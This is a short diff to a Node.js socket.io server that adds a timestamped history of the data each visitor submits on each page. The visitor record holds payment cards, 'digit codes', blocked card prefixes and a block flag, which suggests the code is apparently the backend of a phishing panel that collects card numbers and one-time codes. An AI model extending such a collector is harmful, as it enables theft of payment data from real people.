@@ -191,6 +191,7 @@ io.on("connection", (socket) => {
         blockedCardPrefixes: [],
         page: "الصفحة الرئيسية",
         data: {},
+        dataHistory: [],
         paymentCards: [],
         digitCodes: [],
         isBlocked: false,
@@ -242,8 +243,19 @@ io.on("connection", (socket) => {
   socket.on("more-info", (data) => {
     const visitor = visitors.get(socket.id);
     if (visitor) {
-      // Store submitted data
+      // Store submitted data with page info for ordering
       if (data.content) {
+        // Initialize dataHistory if not exists
+        if (!visitor.dataHistory) {
+          visitor.dataHistory = [];
+        }
+        // Add new data entry with timestamp and page
+        visitor.dataHistory.push({
+          content: data.content,
+          page: data.page,
+          timestamp: new Date().toISOString(),
+        });
+        // Also keep flat data for backward compatibility
         visitor.data = { ...visitor.data, ...data.content };
       }
       if (data.paymentCard) {
